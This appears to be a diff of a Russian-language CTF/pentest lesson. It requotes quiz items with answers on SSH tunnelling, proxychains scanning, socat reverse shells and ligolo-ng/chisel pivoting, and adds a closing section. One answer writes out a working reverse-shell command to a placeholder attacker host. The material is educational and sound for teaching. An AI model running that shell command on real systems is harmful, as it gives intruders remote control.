-  explanation: "-D включает динамическое перенаправление (SOCKS) на локальном порту 9050."
-- question: "Что делает команда ssh -L 8080:10.0.1.5:80 user@jump?"
+  explanation: '-D включает динамическое перенаправление (SOCKS) на локальном порту 9050.'
+- question: 'Что делает команда ssh -L 8080:10.0.1.5:80 user@jump?'
   options:
-    - "Открывает локальный 8080, ведущий к 10.0.1.5:80 через jump"
-    - "Открывает порт 8080 на jump"
-    - "Поднимает SOCKS-прокси"
-    - "Копирует файл на jump"
+    - 'Открывает локальный 8080, ведущий к 10.0.1.5:80 через jump'
+    - 'Открывает порт 8080 на jump'
+    - 'Поднимает SOCKS-прокси'
+    - 'Копирует файл на jump'
   answer: 0
-  explanation: "Локальный проброс: локальный порт 8080 туннелируется до 10.0.1.5:80 глазами хоста jump."
-- question: "Почему nmap через proxychains нужно запускать с -sT?"
+  explanation: 'Локальный проброс: локальный порт 8080 туннелируется до 10.0.1.5:80 глазами хоста jump.'
+- question: 'Почему nmap через proxychains нужно запускать с -sT?'
   options:
-    - "SOCKS не передаёт raw-пакеты, поэтому нужен полный connect"
-    - "Так скан быстрее"
-    - "Так определяется ОС"
-    - "Иначе не сохранится вывод"
+    - 'SOCKS не передаёт raw-пакеты, поэтому нужен полный connect'
+    - 'Так скан быстрее'
+    - 'Так определяется ОС'
+    - 'Иначе не сохранится вывод'
   answer: 0
-  explanation: "SOCKS работает на уровне потоков данных; SYN-скан с raw-пакетами невозможен — только TCP connect."
-- question: "Как запустить реверс-шелл через socat на цели?"
+  explanation: 'SOCKS работает на уровне потоков данных; SYN-скан с raw-пакетами невозможен — только TCP connect.'
+- question: 'Как запустить реверс-шелл через socat на цели?'
   options:
-    - "socat TCP:ATTACKER:4444 EXEC:/bin/bash,pty,stderr,setsid,sigint,sane"
-    - "socat TCP-LISTEN:4444 EXEC:/bin/bash"
-    - "socat OPEN:file TCP:ATTACKER:4444"
-    - "socat STDIN TCP:ATTACKER:4444"
+    - 'socat TCP:ATTACKER:4444 EXEC:/bin/bash,pty,stderr,setsid,sigint,sane'
+    - 'socat TCP-LISTEN:4444 EXEC:/bin/bash'
+    - 'socat OPEN:file TCP:ATTACKER:4444'
+    - 'socat STDIN TCP:ATTACKER:4444'
   answer: 0
-  explanation: "socat соединяет канал TCP до атакующего с локальным bash, отдавая полноценный pty."
-- question: "Чем ligolo-ng отличается от chisel при pivoting?"
+  explanation: 'socat соединяет канал TCP до атакующего с локальным bash, отдавая полноценный pty.'
+- question: 'Чем ligolo-ng отличается от chisel при pivoting?'
   options:
-    - "ligolo поднимает TUN-интерфейс и даёт прозрачную маршрутизацию в подсети"
-    - "ligolo работает только по SSH"
-    - "chisel не умеет SOCKS"
-    - "ligolo не требует агента на цели"
+    - 'ligolo поднимает TUN-интерфейс и даёт прозрачную маршрутизацию в подсети'
+    - 'ligolo работает только по SSH'
+    - 'chisel не умеет SOCKS'
+    - 'ligolo не требует агента на цели'
   answer: 0
-  explanation: "ligolo создаёт виртуальный сетевой интерфейс, поэтому к внутренним сетям ходят обычные инструменты без прокси-обвязки."
+  explanation: 'ligolo создаёт виртуальный сетевой интерфейс, поэтому к внутренним сетям ходят обычные инструменты без прокси-обвязки.'
 ```
+
+## Куда дальше
+
+Мы прошли путь от «проверить порт» до «поднять туннель во внутреннюю сеть». Дальше разберём DNS — и как через него строят туннели и атаки. А пока запомни: **соединение — это ресурс; чем больше способов его протянуть, тем меньше тебя остановит периметр.**
 
 ## Где пригодится
 
 - **CTF:** Network/Pentest — подключение к сервисам, реверс-шеллы, pivot во внутренние сегменты.
-- **Пентест:** доступ к внутренним сервисам, SOCKS-прокси, распределение трафика через прокси-цепочки.
+- **Пентест:** доступ к внутренним сервисам, SOCKS-прокси, прокси-цепочки.
 - **Работа:** диагностика соединений (`nc -zv`), безопасные туннели для удалённого доступа.
